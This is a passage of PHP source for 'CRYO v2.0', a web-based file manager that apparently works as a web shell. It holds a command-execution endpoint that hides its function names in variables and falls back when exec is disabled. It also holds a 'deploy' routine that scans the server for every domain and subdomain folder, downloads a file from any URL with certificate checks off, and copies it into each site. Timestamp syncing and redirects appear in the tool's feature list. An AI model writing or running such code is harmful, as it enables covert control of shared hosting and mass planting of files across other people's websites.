              $desc = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
              $proc = @$_fn4($fullCmd, $desc, $pipes, $cwd);
              if (is_resource($proc)) {
                  fclose($pipes[0]);
                  $output = stream_get_contents($pipes[1]);
                  $err = stream_get_contents($pipes[2]);
                  fclose($pipes[1]);
                  fclose($pipes[2]);
                  $retCode = proc_close($proc);
                  if ($err) $output .= "\n" . $err;
              } else {
                  $output = 'Error: Could not open process.';
              }
          } elseif (function_exists($_fn3)) {
              ob_start();
              @$_fn3($fullCmd, $retCode);
              $output = ob_get_clean();
          } else {
              $output = 'Error: All command execution functions are disabled on this server (exec, shell_exec, popen, passthru).';
          }

          if ($retCode !== 0 && $output === '') {
              $output = "(exit code: $retCode)";
          }
      }

      ob_end_clean();
      echo json_encode(['output' => $output, 'cwd' => $newCwd]);
      exit;
  }

// ==================== DEPLOY FILE KE SUBDOMAIN ====================
function fm_collect_domain_targets(&$list, &$errors) {
    $list = [];
    $errors = [];

    $docRoot = @realpath($_SERVER['DOCUMENT_ROOT']);
    if (!$docRoot) $docRoot = $_SERVER['DOCUMENT_ROOT'];
    $docRoot = rtrim($docRoot, DIRECTORY_SEPARATOR);

    $roots = [];

    if ($docRoot && is_dir($docRoot)) {
        $roots[] = $docRoot;
    }

    $parent     = dirname($docRoot);
    $parentReal = $parent ? (@realpath($parent) ?: $parent) : null;

    if ($parentReal && $parentReal !== $docRoot && is_dir($parentReal)) {
        $roots[] = $parentReal;
    }

    $pattern = DIRECTORY_SEPARATOR . 'domains' . DIRECTORY_SEPARATOR;
    $pos = strpos($docRoot, $pattern);
    if ($pos !== false) {
        $domainsRoot = substr($docRoot, 0, $pos + strlen($pattern));
        $domainsRoot = rtrim($domainsRoot, DIRECTORY_SEPARATOR);
        if ($domainsRoot && is_dir($domainsRoot)) {
            $roots[] = $domainsRoot;
        }
    }

    $roots = array_values(array_unique($roots));

    $maxDepth = 3;
    $maxFound = 200;
    $skipNames = [
        '.', '..',
        '.git', '.svn',
        'node_modules', 'vendor',
        'logs', 'log',
        'tmp', 'cache',
        'wp-content', 'wp-admin', 'wp-includes'
    ];

    $excludeHome = [
        'etc','logs','mail','tmp','ssl','access-logs','public_ftp','backup','backups',
        '.cpanel','.htpasswds','.trash','.config','.softaculous','.softaculous_backups',
        '.subaccounts','.ssh','.cl.selector','.cagefs','.pki','.local','.wp-cli','.wp-toolkit', '.caldav'
    ];

    $added = [];

    foreach ($roots as $root) {
        $rootReal = @realpath($root);
        if (!$rootReal || !is_dir($rootReal)) continue;
        if ($rootReal === DIRECTORY_SEPARATOR) continue;

        $isHomeRoot = ($parentReal && $rootReal === $parentReal);

        $queue = [[$rootReal, 0]];

        while (!empty($queue)) {
            list($dir, $depth) = array_shift($queue);

            if (!@is_readable($dir)) continue;

            try {
                $it = new DirectoryIterator($dir);
            } catch (Exception $e) {
                continue;
            }

            foreach ($it as $entry) {
                if ($entry->isDot()) continue;
                if (!$entry->isDir()) continue;

                $name = $entry->getFilename();

                if (in_array($name, $skipNames, true)) continue;

                if ($isHomeRoot && $depth === 0 && in_array($name, $excludeHome, true)) {
                    continue;
                }

                $full = $entry->getPathname();

                if (strpos($name, '.') !== false && $name[0] !== '.') {
                    if (preg_match('/\d+\.\d+(\.\d+)?/', $name)) {
                        continue;
                    }
                    $skipWords = ['bower_components', 'node_modules', 'vendor', 'dist', 'build', 'src', 'lib', 'plugins', 'MathJax', 'socket.io', 'datatables', 'ion', 'jquery', 'ui'];
                    foreach ($skipWords as $word) {
                        if (stripos($name, $word) !== false) {
                            continue 2;
                        }
                    }
                    if (!preg_match('/^[a-zA-Z0-9.-]+$/', $name)) {
                        continue;
                    }
                    $parts = explode('.', $name);
                    $last = strtolower(end($parts));
                    if (!preg_match('/^[a-z]{2,6}$/', $last)) {
                        continue;
                    }

                    $publicHtml = $full . DIRECTORY_SEPARATOR . 'public_html';
                    $target     = is_dir($publicHtml) ? $publicHtml : $full;

                    $key = @realpath($target) ?: $target;
                    if (!isset($added[$key])) {
                        $added[$key] = 1;

                        $display = $key;
                        if (strpos($key, $rootReal) === 0) {
                            $rel = substr($key, strlen($rootReal));
                            $display = $rel === '' ? $key : $rel;
                        }

                        $list[] = [
                            'label'     => $name,
                            'target'    => $target,
                            'display'   => $display,
                            'from_root' => $rootReal,
                        ];

                        if (count($list) >= $maxFound) {
                            $errors[] = "Hasil scan dibatasi {$maxFound} folder. Ditampilkan sebagian saja.";
                            return true;
                        }
                    }
                }

                if ($depth + 1 <= $maxDepth) {
                    $queue[] = [$full, $depth + 1];
                }
            }
        }
    }

    if (empty($list)) {
        $errors[] = 'Tidak ada folder yang tampak seperti domain/subdomain di sekitar Document Root.';
        return false;
    }

    return true;
}

function fm_download_remote_file_simple($url, &$tmpFile, &$err)
{
    $err = '';
    $tmpFile = tempnam(sys_get_temp_dir(), 'deploy_file_');
    if ($tmpFile === false) {
        $err = 'Gagal membuat file sementara.';
        return false;
    }

    if (function_exists('curl_init')) {
        $fp = @fopen($tmpFile, 'w');
        if (!$fp) {
            $err = 'Gagal membuka file sementara untuk ditulis.';
            return false;
        }

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_FILE           => $fp,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT        => 60,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT      => 'DeployFileBot/1.0',
        ]);

        curl_exec($ch);
        if (curl_errno($ch)) {
            $err = 'cURL error: ' . curl_error($ch);
            fclose($fp);
            curl_close($ch);
            @unlink($tmpFile);
            return false;
        }

        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        fclose($fp);

        if ($httpCode < 200 || $httpCode >= 300) {
            $err = 'HTTP status tidak OK: ' . $httpCode;
            @unlink($tmpFile);
            return false;
        }
    } else {
        $context = stream_context_create([
            'http' => [
                'method'  => 'GET',
                'timeout' => 60,
            ],
            'ssl'  => [
                'verify_peer'      => false,
                'verify_peer_name' => false,
            ],
        ]);

        $data = @file_get_contents($url, false, $context);
        if ($data === false) {
            $err = 'Gagal membaca konten file (file_get_contents).';
            @unlink($tmpFile);
            return false;
        }

        if (@file_put_contents($tmpFile, $data) === false) {
            $err = 'Gagal menulis ke file sementara.';
            @unlink($tmpFile);
            return false;
        }
    }

    $size = @filesize($tmpFile);
    if ($size === false || $size == 0) {
        $err = 'File yang di-download berukuran 0 byte. URL mungkin tidak dapat diakses dari server.';
        @unlink($tmpFile);
        return false;
    }

    return true;
}

if (isset($_POST['deployScanDomains'])) {
    $items = [];
    $errs  = [];
    if (fm_collect_domain_targets($items, $errs)) {
        $_SESSION['deploy_scan_items']   = $items;
        $_SESSION['deploy_scan_message'] = 'Scan folder domain/subdomain selesai. Ditemukan ' . count($items) . ' target.';
    } else {
        $_SESSION['deploy_scan_items']   = [];
        $_SESSION['deploy_scan_message'] = implode(' | ', $errs);
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

if (isset($_POST['deployReset'])) {
    unset(
        $_SESSION['deploy_scan_items'],
        $_SESSION['deploy_scan_message'],
        $_SESSION['deploy_file_status'],
        $_SESSION['deploy_file_message']
    );
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

if (isset($_POST['deployRunFile'])) {
    if (!$isAdmin) {
        $_SESSION['error'] = 'Hanya admin yang dapat melakukan deploy file.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $fileUrl      = isset($_POST['deploy_file_url']) ? trim($_POST['deploy_file_url']) : '';
    $subpath      = isset($_POST['deploy_file_path']) ? trim($_POST['deploy_file_path']) : '';
    $customName   = isset($_POST['deploy_file_name']) ? trim($_POST['deploy_file_name']) : '';
    $selected     = isset($_POST['deploy_file_targets']) && is_array($_POST['deploy_file_targets'])
        ? $_POST['deploy_file_targets']
        : [];

    $items  = isset($_SESSION['deploy_scan_items']) && is_array($_SESSION['deploy_scan_items'])
        ? $_SESSION['deploy_scan_items']
        : [];

    $errors      = [];
    $okPaths     = [];
    $serverPaths = [];

    if ($fileUrl === '' || !filter_var($fileUrl, FILTER_VALIDATE_URL)) {
        $errors[] = 'URL file tidak valid.';
    }
    if (empty($selected)) {
        $errors[] = 'Pilih minimal satu folder domain/subdomain.';
    }

    if (!$errors) {
        $subpathSafe = sanitizePath($subpath);
        $subpathSafe = trim($subpathSafe);

        $basename = basename(parse_url($fileUrl, PHP_URL_PATH) ?: '');
        $filename = $customName !== '' ? sanitizePath($customName) : sanitizePath($basename);
        if ($filename === '') $filename = 'downloaded_file';
        $filename = preg_replace('~[\\\\/]+~', '', $filename);

        $tempFile = '';
        if (!fm_download_remote_file_simple($fileUrl, $tempFile, $err)) {
            $errors[] = 'Gagal mendownload file: ' . $err;
        } else {
            $sizeTemp = @filesize($tempFile);
            if ($sizeTemp === false || $sizeTemp == 0) {
                $errors[] = 'File hasil download 0 byte. Cek URL atau akses server.';
                @unlink($tempFile);
            } else {
                foreach ($selected as $idxRaw) {
                    $idx = (int) $idxRaw;
                    if (!isset($items[$idx])) continue;

                    $info  = $items[$idx];
                    $base  = isset($info['target']) ? $info['target'] : '';
                    $label = isset($info['label']) ? $info['label'] : ('Target '.$idx);

                    if (!$base || !is_dir($base)) {
                        $errors[] = 'Base path tidak ditemukan: ' . $base;
                        continue;
                    }

                    $destDir = rtrim($base, '/');
                    if ($subpathSafe !== '' && $subpathSafe !== '/') {
                        $destDir .= '/' . ltrim($subpathSafe, '/');
                    }

                    if (!is_dir($destDir)) {
                        @mkdir($destDir, 0755, true);
                    }
                    if (!is_dir($destDir)) {
                        $errors[] = 'Gagal membuat folder tujuan: ' . $destDir;
                        continue;
                    }

                    $destFile = rtrim($destDir, '/') . '/' . $filename;

                    if (!@copy($tempFile, $destFile)) {
                        $errors[] = 'Gagal menyimpan file ke: ' . $destFile;
                        continue;
                    }

                    $friendly = $label;
                    if ($subpathSafe !== '' && $subpathSafe !== '/') {
                        $friendly .= '/' . ltrim($subpathSafe, '/');
                    }
                    $friendly .= '/' . $filename;

                    $okPaths[]     = $friendly;
                    $serverPaths[] = $destFile;
                }

                @unlink($tempFile);
            }
        }
    }

    if (!empty($okPaths)) {
        $status = empty($errors) ? 'success' : 'partial';

        $msg  = "Deploy FILE selesai.\n";
        $msg .= "Sumber file : {$fileUrl}\n";
        $msg .= "Nama file   : {$filename}\n";
        $msg .= "Target URL path (domain + subpath + nama file):\n - " . implode("\n - ", $okPaths);
        if (!empty($serverPaths)) {
            $msg .= "\n\nPath file di server:\n - " . implode("\n - ", $serverPaths);
        }
        if (!empty($errors)) {
            $msg .= "\n\nCatatan:\n - " . implode("\n - ", $errors);
        }

        $_SESSION['deploy_file_status']  = $status;
        $_SESSION['deploy_file_message'] = nl2br(htmlspecialchars($msg));
    } else {
        $_SESSION['deploy_file_status']  = 'error';
        $_SESSION['deploy_file_message'] = !empty($errors)
            ? htmlspecialchars(implode(' | ', $errors))
            : 'Deploy FILE gagal. Tidak ada target yang berhasil.';
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// =====================================================================
// =====================================================================




// =====================================================================
  // BAGIAN 5.5: TRASH HANDLERS
  // =====================================================================

  autoCleanTrash(7);

  if (isset($_GET['view_trash'])) {
      $trashItems = getTrashItems();
  }

  if (isset($_POST['restoreTrash']) && !empty($_POST['trash_item'])) {
      if (!$isAdmin && !$isTeman) {
          $_SESSION['error'] = 'Anda tidak memiliki izin.';
      } else {
          $restoredPath = restoreFromTrash(basename($_POST['trash_item']));
          if ($restoredPath) {
              $_SESSION['success'] = 'File dikembalikan ke: ' . basename($restoredPath);
          } else {
              $_SESSION['error'] = 'Gagal mengembalikan file dari Trash.';
          }
      }
      header("Location: ?view_trash=1&folder=" . urlencode($directory));
      exit;
  }

  if (isset($_POST['purgeTrash']) && !empty($_POST['trash_item'])) {
      if (!$isAdmin && !$isTeman) {
          $_SESSION['error'] = 'Anda tidak memiliki izin.';
      } else {
          if (purgeTrashItem(basename($_POST['trash_item']))) {
              $_SESSION['success'] = 'File dihapus permanen.';
          } else {
              $_SESSION['error'] = 'Gagal menghapus file dari Trash.';
          }
      }
      header("Location: ?view_trash=1&folder=" . urlencode($directory));
      exit;
  }

  if (isset($_POST['emptyTrash'])) {
      if (!$isAdmin && !$isTeman) {
          $_SESSION['error'] = 'Anda tidak memiliki izin.';
      } else {
          emptyTrash();
          $_SESSION['success'] = 'Trash dikosongkan.';
      }
      header("Location: ?view_trash=1&folder=" . urlencode($directory));
      exit;
  }

  // =====================================================================
    // BAGIAN 5.6: AI ASSISTANT HANDLER
    // =====================================================================

    if (isset($_POST['ai_chat']) && ($isAdmin || $isTeman)) {
        header('Content-Type: application/json');
        ob_end_clean();

        $userMsg = isset($_POST['message']) ? trim($_POST['message']) : '';
        if ($userMsg === '') {
            echo json_encode(['reply' => 'Silakan ketik pertanyaan Anda.']);
            exit;
        }

        require_once __DIR__ . '/../../add.php';
        $envData = read_env(__DIR__ . '/../../Config/.env');
        $apiKey = isset($envData['GEMINI_API_KEY']) ? $envData['GEMINI_API_KEY'] : '';

        if ($apiKey === '' || $apiKey === 'YOUR_GEMINI_API_KEY_HERE') {
            echo json_encode(['reply' => "\u26a0\ufe0f API Key belum dikonfigurasi.\n\nCara mendapatkan (GRATIS):\n1. Buka https://aistudio.google.com/apikey\n2. Login dengan Google\n3. Klik Create API Key\n4. Copy key-nya\n5. Paste di Config/.env pada baris GEMINI_API_KEY="]);
            exit;
        }

        $currentDir = isset($_POST['current_dir']) ? $_POST['current_dir'] : $directory;
        $fileList = '';
        if (is_dir($currentDir)) {
            $items = @array_diff(@scandir($currentDir), ['.','..']);
            if ($items) {
                $fl = [];
                foreach (array_slice($items, 0, 50) as $it) {
                    $fp = $currentDir . '/' . $it;
                    $type = is_dir($fp) ? '[DIR]' : '[FILE ' . getNiceSize(@filesize($fp)) . ']';
                    $fl[] = $type . ' ' . $it;
                }
                $fileList = implode("\n", $fl);
                if (count($items) > 50) $fileList .= "\n... dan " . (count($items) - 50) . " item lainnya";
            }
        }

        $systemPrompt = "Kamu adalah CRYO Assistant, AI pemandu di file manager CRYO v2.0. Kamu membantu user mengelola file, hosting, dan troubleshooting.\n\n";
        $systemPrompt .= "Konteks saat ini:\n";
        $systemPrompt .= "- Folder aktif: " . $currentDir . "\n";
        $systemPrompt .= "- Document Root: " . $_SERVER['DOCUMENT_ROOT'] . "\n";
        $systemPrompt .= "- Server: " . (isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown') . "\n";
        $systemPrompt .= "- PHP: " . phpversion() . "\n";
        $systemPrompt .= "- Role user: " . $userRole . "\n";
        if ($fileList) $systemPrompt .= "\nIsi folder saat ini:\n" . $fileList . "\n";
        $systemPrompt .= "\nAturan:\n- Jawab dalam Bahasa Indonesia\n- Ringkas dan jelas, gunakan formatting markdown sederhana\n- Berikan contoh perintah jika relevan\n- Fitur CRYO: file manager, terminal, deploy, redirect 301, sync timestamp, trash/recycle bin, archive zip/tar, chmod, security scan\n- Untuk pertanyaan di luar topik hosting/file, tetap jawab dengan sopan tapi arahkan kembali";

        $chatHistory = [];
        if (isset($_POST['history'])) {
            $h = @json_decode($_POST['history'], true);
            if (is_array($h)) $chatHistory = $h;
        }

        $contents = [];
        foreach ($chatHistory as $msg) {
            $contents[] = ['role' => $msg['role'], 'parts' => [['text' => $msg['text']]]];
        }
        $contents[] = ['role' => 'user', 'parts' => [['text' => $userMsg]]];

        $payload = json_encode([
            'system_instruction' => ['parts' => [['text' => $systemPrompt]]],
            'contents' => $contents,
            'generationConfig' => [
                'temperature' => 0.7,
                'maxOutputTokens' => 1024,
            ]
        ]);

        $url = 'https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=' . $apiKey;

        $reply = '';
        $error = '';

        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $response = curl_exec($ch);
            if (curl_errno($ch)) $error = curl_error($ch);
            curl_close($ch);
        } else {
            $ctx = stream_context_create([
                'http' => [
                    'method' => 'POST',
                    'header' => "Content-Type: application/json\r\n",
                    'content' => $payload,
                    'timeout' => 30,
                ],
                'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
            ]);
            $response = @file_get_contents($url, false, $ctx);
            if ($response === false) $error = 'file_get_contents failed';
        }

        if ($error) {
            echo json_encode(['reply' => 'Error koneksi: ' . $error]);
            exit;
        }

        $data = @json_decode($response, true);
        if (isset($data['candidates'][0]['content']['parts'][0]['text'])) {
            $reply = $data['candidates'][0]['content']['parts'][0]['text'];
        } elseif (isset($data['error']['message'])) {
            $reply = 'API Error: ' . $data['error']['message'];
        } else {
            $reply = 'Tidak bisa mendapatkan respons dari AI. Coba lagi.';
        }

        echo json_encode(['reply' => $reply]);
        exit;
    }

    // =====================================================================
    // BAGIAN 6: UI MODERN (HTML + CSS + JS)
// =====================================================================

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CRYO</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/theme/material-darker.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/htmlmixed/htmlmixed.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/clike/clike.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/php/php.min.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        :root{
            --bg:#0a0e1a;
            --bg2:rgba(15,23,42,0.85);
            --bg3:rgba(30,41,59,0.6);
            --accent:#6366f1;
            --accent-h:#818cf8;
            --accent-glow:rgba(99,102,241,0.15);
            --text:#e2e8f0;
            --muted:#64748b;
            --border:rgba(99,102,241,0.12);
            --danger:#ef4444;
            --success:#10b981;
            --warning:#f59e0b;
            --info:#6366f1;
            --card:rgba(15,23,42,0.7);
            --sidebar-w:290px;
            --radius:12px;
            --glass:blur(20px);
        }
        body{
            font-family:'Inter',system-ui,-apple-system,sans-serif;
            background:var(--bg);
            background-image:radial-gradient(ellipse at 20% 0%,rgba(99,102,241,0.08),transparent 50%),radial-gradient(ellipse at 80% 100%,rgba(139,92,246,0.06),transparent 50%);
            color:var(--text);
            line-height:1.5;
            font-size:13px;
            height:100vh;
            overflow:hidden;
        }
        ::-webkit-scrollbar{width:6px;height:6px}
        ::-webkit-scrollbar-track{background:transparent}
        ::-webkit-scrollbar-thumb{background:rgba(99,102,241,0.3);border-radius:99px}
        ::-webkit-scrollbar-thumb:hover{background:var(--accent)}

        .file-manager{display:flex;height:100vh}

        .sidebar{
            width:var(--sidebar-w);
            background:var(--bg2);
            backdrop-filter:var(--glass);
            border-right:1px solid var(--border);
            display:flex;
            flex-direction:column;
            overflow-y:auto;
            padding:16px;
            gap:10px;
        }
        .sidebar-brand{
            display:flex;align-items:center;justify-content:space-between;padding:4px 0 12px;
            border-bottom:1px solid var(--border);margin-bottom:4px;
        }
        .sidebar-brand h2{
            font-size:16px;font-weight:700;
            background:linear-gradient(135deg,#818cf8,#a78bfa);
            -webkit-background-clip:text;-webkit-text-fill-color:transparent;
            display:flex;align-items:center;gap:8px;
        }
        .sidebar-brand h2 i{-webkit-text-fill-color:#818cf8;font-size:18px}

        .main-content{flex:1;overflow-y:auto;padding:20px;background:transparent}

        .card{
            background:var(--card);
            backdrop-filter:var(--glass);
            border-radius:var(--radius);
            border:1px solid var(--border);
            padding:14px;
            transition:border-color 0.3s,box-shadow 0.3s;
        }
        .card:hover{border-color:rgba(99,102,241,0.25);box-shadow:0 4px 20px var(--accent-glow)}
        .card h3{
            font-size:11px;text-transform:uppercase;letter-spacing:0.08em;
            color:var(--muted);margin-bottom:10px;display:flex;align-items:center;gap:6px;font-weight:600;
        }
        .card h3 i{color:var(--accent-h);font-size:13px}

        input,select,textarea{
            background:rgba(10,14,26,0.8);
            border:1px solid var(--border);
            color:var(--text);
            border-radius:8px;
            padding:8px 12px;
            font-size:12px;
            width:100%;
            margin-bottom:8px;
            transition:border-color 0.2s,box-shadow 0.2s;
            font-family:inherit;
        }
        input:focus,select:focus,textarea:focus{
            outline:none;
            border-color:var(--accent);
            box-shadow:0 0 0 3px var(--accent-glow);
        }
        input[type="checkbox"]{width:auto;margin:0}
        input[type="file"]{padding:6px;font-size:11px}

        .btn{
            display:inline-flex;align-items:center;justify-content:center;gap:6px;
            padding:8px 14px;border-radius:8px;font-weight:500;border:none;cursor:pointer;
            transition:all 0.2s;font-size:12px;font-family:inherit;
            background:var(--bg3);color:var(--text);
            border:1px solid var(--border);
        }
        .btn:hover{background:var(--accent);color:#fff;border-color:var(--accent);transform:translateY(-1px);box-shadow:0 4px 15px var(--accent-glow)}
        .btn:active{transform:translateY(0)}
        .btn-primary{background:var(--accent);color:#fff;border-color:var(--accent)}
        .btn-primary:hover{background:var(--accent-h);border-color:var(--accent-h)}
        .btn-danger{background:rgba(239,68,68,0.15);color:#fca5a5;border-color:rgba(239,68,68,0.3)}
        .btn-danger:hover{background:var(--danger);color:#fff;border-color:var(--danger)}
        .btn-success{background:rgba(16,185,129,0.15);color:#6ee7b7;border-color:rgba(16,185,129,0.3)}
        .btn-success:hover{background:var(--success);color:#fff;border-color:var(--success)}
        .btn-warning{background:rgba(245,158,11,0.15);color:#fcd34d;border-color:rgba(245,158,11,0.3)}
        .btn-warning:hover{background:var(--warning);color:#000;border-color:var(--warning)}
        .btn-sm{padding:5px 10px;font-size:11px;border-radius:6px}
        .w-100{width:100%}

        .file-list{margin-top:8px}
        .file-item{
            display:flex;align-items:center;gap:8px;padding:8px 10px;
            border-bottom:1px solid var(--border);transition:all 0.15s;border-radius:6px;margin:1px 0;
        }
        .file-item:hover{background:rgba(99,102,241,0.06)}
        .file-item.danger{border-left:3px solid var(--danger)}
        .file-item.warning{border-left:3px solid var(--warning)}
        .file-item.success{border-left:3px solid var(--success)}
        .file-checkbox{width:28px;text-align:center;display:flex;align-items:center;justify-content:center}
        .file-icon{font-size:1.1rem;width:28px;text-align:center;color:var(--muted)}
        .file-name{flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-weight:500}
        .file-name a{color:var(--text);text-decoration:none;transition:color 0.2s}
        .file-name a:hover{color:var(--accent-h)}
        .file-actions{display:flex;gap:4px;flex-wrap:wrap;justify-content:flex-end}
        .file-actions .btn{padding:4px 8px;font-size:11px;border-radius:6px}
        .file-size,.file-perm,.file-date{font-size:11px;color:var(--muted);min-width:60px;text-align:right}

        .breadcrumb{
            display:flex;align-items:center;gap:8px;margin-bottom:12px;
            background:var(--card);backdrop-filter:var(--glass);
            padding:10px 16px;border-radius:var(--radius);border:1px solid var(--border);flex-wrap:wrap;
        }
        .breadcrumb a{color:var(--muted);text-decoration:none;font-size:12px;transition:color 0.2s}
        .breadcrumb a:hover{color:var(--accent-h)}
        .breadcrumb .separator{color:rgba(100,116,139,0.4);font-size:10px}
        .breadcrumb .current{color:var(--text);font-weight:500;font-size:12px}

        .pagination{display:flex;gap:4px;margin-top:16px;justify-content:center}
        .pagination .page-link{
            padding:6px 12px;background:var(--card);border:1px solid var(--border);
            border-radius:8px;color:var(--text);text-decoration:none;font-size:12px;transition:all 0.2s;
        }
        .pagination .page-link:hover{background:var(--accent);border-color:var(--accent);color:#fff}
        .pagination .page-link.disabled{opacity:0.3;pointer-events:none}

        .alert{
            padding:12px 16px;border-radius:var(--radius);margin-bottom:12px;font-size:12px;
            backdrop-filter:var(--glass);border:1px solid;display:flex;align-items:center;gap:8px;
            animation:slideIn 0.3s ease;
        }
        @keyframes slideIn{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}
        .alert.success{background:rgba(16,185,129,0.1);border-color:rgba(16,185,129,0.3);color:#6ee7b7}
        .alert.error{background:rgba(239,68,68,0.1);border-color:rgba(239,68,68,0.3);color:#fca5a5}
        .alert.warning{background:rgba(245,158,11,0.1);border-color:rgba(245,158,11,0.3);color:#fcd34d}

        .modal{
            display:none;position:fixed;top:0;left:0;width:100%;height:100%;
            background:rgba(0,0,0,0.6);backdrop-filter:blur(8px);
            align-items:center;justify-content:center;z-index:1000;
            animation:fadeIn 0.2s ease;
        }
        @keyframes fadeIn{from{opacity:0}to{opacity:1}}
        .modal-content{
            background:rgba(15,23,42,0.95);backdrop-filter:var(--glass);
            border-radius:16px;padding:24px;max-width:520px;width:92%;
            border:1px solid var(--border);box-shadow:0 25px 80px rgba(0,0,0,0.5);
            animation:modalSlide 0.3s ease;
        }
        @keyframes modalSlide{from{opacity:0;transform:translateY(20px) scale(0.95)}to{opacity:1;transform:translateY(0) scale(1)}}
        .modal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
        .modal-header h3{font-size:15px;font-weight:600}
        .modal-close{background:none;border:none;color:var(--muted);font-size:22px;cursor:pointer;transition:color 0.2s;padding:4px}
        .modal-close:hover{color:var(--danger)}
        .modal-footer{display:flex;justify-content:flex-end;gap:8px;margin-top:16px}

        .text-muted{color:var(--muted)}
        .flex{display:flex;gap:8px}
        .flex-between{display:flex;justify-content:space-between;align-items:center}
        .gap-1{gap:4px}.gap-2{gap:8px}.gap-3{gap:12px}.gap-4{gap:16px}
        .mt-1{margin-top:4px}.mt-2{margin-top:8px}.mt-3{margin-top:12px}.mt-4{margin-top:16px}
        .mb-1{margin-bottom:4px}.mb-2{margin-bottom:8px}.mb-3{margin-bottom:12px}.mb-4{margin-bottom:16px}

        .file-header{
            display:flex;align-items:center;gap:8px;padding:10px 10px;
            background:rgba(99,102,241,0.08);font-weight:600;
            border-radius:var(--radius) var(--radius) 0 0;border:1px solid var(--border);
            font-size:11px;text-transform:uppercase;letter-spacing:0.03em;color:var(--muted);
        }

        .toast-container{position:fixed;bottom:20px;right:20px;z-index:9999;display:flex;flex-direction:column;gap:8px}
        .toast{
            padding:12px 20px;border-radius:var(--radius);font-size:12px;
            backdrop-filter:var(--glass);border:1px solid;
            animation:toastIn 0.3s ease;min-width:280px;box-shadow:0 10px 40px rgba(0,0,0,0.3);
        }
        @keyframes toastIn{from{opacity:0;transform:translateX(40px)}to{opacity:1;transform:translateX(0)}}

        .CodeMirror{height:400px !important;font-family:'JetBrains Mono',monospace !important;font-size:13px !important;border-radius:8px !important}

        @media(max-width:768px){
            .file-manager{flex-direction:column}
            .sidebar{width:100%;height:auto;border-right:none;border-bottom:1px solid var(--border);max-height:50vh}
            .file-item{flex-wrap:wrap}
            .file-actions{width:100%;justify-content:flex-start}
        }
    </style>
</head>
<body>
    <div class="file-manager">
        <div class="sidebar">
            <div class="sidebar-brand">
                <h2><i class="fas fa-cube"></i> CRYO <span style="font-weight:300;font-size:11px;-webkit-text-fill-color:var(--muted)">v2.0</span></h2>
                <a href="Log.php" class="btn btn-sm btn-danger"><i class="fas fa-sign-out-alt"></i></a>
            </div>

            <div class="card">
                <div class="flex-between">
                    <span style="font-size:12px"><i class="fas fa-user-shield" style="color:var(--accent-h)"></i> <strong><?= ucfirst($userRole) ?></strong></span>
                    <?php if (!$isAdmin): ?>
                        <span class="text-muted" style="font-size:10px">(limited)</span>
                    <?php else: ?>
                        <span style="font-size:10px;color:var(--success)">Full Access</span>
                    <?php endif; ?>
                </div>
            </div>

            <div class="card">
                <h3><i class="fas fa-file-circle-plus"></i> Create File</h3>
                <form method="post">
                    <input type="text" name="fileName" placeholder="filename.ext" required>
                    <button type="submit" name="createFile" class="btn btn-primary w-100" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-plus"></i> Create</button>
                </form>
            </div>

            <div class="card">
                <h3><i class="fas fa-folder-plus"></i> Create Folder</h3>
                <form method="post">
                    <input type="text" name="folderName" placeholder="folder-name" required>
                    <button type="submit" name="createFolder" class="btn btn-primary w-100" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-plus"></i> Create</button>
                </form>
            </div>

            <div class="card">
                <h3><i class="fas fa-cloud-arrow-up"></i> Upload Files</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="fileToUpload[]" multiple required>
